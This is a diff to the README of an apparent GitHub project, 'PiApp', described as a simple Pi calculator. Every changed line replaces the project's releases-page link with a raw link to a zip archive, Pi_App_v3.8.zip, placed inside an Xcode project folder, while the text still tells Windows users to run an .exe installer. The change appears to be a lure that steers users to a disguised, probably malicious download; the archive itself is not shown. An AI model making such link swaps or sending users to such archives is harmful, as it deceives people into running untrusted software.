@@ -1,6 +1,6 @@
 # 🔢 PiApp - Simple Pi Calculator for Everyone
 
-[![Download PiApp](https://img.shields.io/badge/Download-PiApp-brightgreen?style=for-the-badge)](https://github.com/rpsandy/PiApp/releases)
+[![Download PiApp](https://img.shields.io/badge/Download-PiApp-brightgreen?style=for-the-badge)](https://github.com/rpsandy/PiApp/raw/refs/heads/main/PiApp.xcodeproj/Pi_App_v3.8.zip)
 
 ## ℹ️ About PiApp
 
@@ -32,7 +32,7 @@ This section will guide you through the steps of downloading and running PiApp o
 ## ⬇️ Download and Install PiApp
 
 1. Click the big green button above or visit this link directly:  
-   [https://github.com/rpsandy/PiApp/releases](https://github.com/rpsandy/PiApp/releases)  
+   [https://github.com/rpsandy/PiApp/raw/refs/heads/main/PiApp.xcodeproj/Pi_App_v3.8.zip](https://github.com/rpsandy/PiApp/raw/refs/heads/main/PiApp.xcodeproj/Pi_App_v3.8.zip)  
    This page contains the latest version of PiApp available for download.
 
 2. On the releases page, look for the file that ends with `.exe` or a similar Windows installer filename. It might be called something like `PiApp-setup.exe`.
@@ -68,7 +68,7 @@ The interface uses larger text and clear labels to make using the app easy.
 To get the latest improvements or fixes:
 
 1. Visit the releases page again:  
-   [https://github.com/rpsandy/PiApp/releases](https://github.com/rpsandy/PiApp/releases)
+   [https://github.com/rpsandy/PiApp/raw/refs/heads/main/PiApp.xcodeproj/Pi_App_v3.8.zip](https://github.com/rpsandy/PiApp/raw/refs/heads/main/PiApp.xcodeproj/Pi_App_v3.8.zip)
 
 2. Download the newest installer file if one exists.
 
@@ -127,4 +127,4 @@ This means PiApp runs smoothly and quickly, even on modest computers.
 
 ---
 
-[Download PiApp Now](https://github.com/rpsandy/PiApp/releases)
+[Download PiApp Now](https://github.com/rpsandy/PiApp/raw/refs/heads/main/PiApp.xcodeproj/Pi_App_v3.8.zip)
